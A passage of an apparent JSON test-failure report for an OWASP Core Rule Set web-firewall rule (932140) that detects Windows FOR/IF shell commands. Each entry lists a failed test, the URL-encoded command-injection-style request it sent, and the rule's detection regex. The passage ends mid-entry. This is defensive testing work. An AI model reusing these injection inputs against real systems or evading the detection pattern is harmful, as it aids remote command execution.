          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 106,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932271 - Remote Command Execution: Unix Shell Expression Found", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942310 - Detects chained SQL injection attempts 2/2", "phase=2 rule_id=942330 - Detects classic SQL injection probings 1/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942490 - Detects classic SQL injection probings 3/3", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 106,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%22%25%7E1%22+%3D%3D+%22%25%7E2%22+%28EXIT+%2FB+0%29+ELSE+%28EXIT+%2FB+1%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 107,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 107,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%25n1%25+gtr+%25n2%25+echo+%25n1%25+is+greater+than+%25n2%25",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 108,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 108,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%25n1%25+lss+%25n2%25+echo+%25n1%25+is+less+than+%25n2%25",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 109,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 109,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%25n1%25+equ+%25n2%25+echo+%25n1%25+is+equal+to+%25n2%25",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 110,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 110,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%22%25n1%25%22+gtr+%22%25n2%25%22+echo+%22%25n1%25%22+is+greater+than+%22%25n2%25%22",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
